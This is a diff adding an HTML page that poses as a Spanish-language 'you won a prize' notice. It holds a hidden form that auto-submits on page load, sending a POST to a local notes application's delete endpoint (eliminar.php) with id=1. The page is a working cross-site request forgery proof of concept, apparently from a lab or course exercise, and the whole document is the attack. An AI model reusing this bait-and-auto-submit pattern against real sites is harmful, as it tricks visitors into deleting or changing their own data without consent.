@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Felicidades ganaste un premio</h1>
+    <form id="csrf-attack" method="POST" action="http://localhost:8000/notas/eliminar.php">
+        <input type="hidden" name="id" value="1">
+    </form>
+    <script>
+        document.getElementById("csrf-attack" ).submit();
+    </script>
+</body>
+</html>
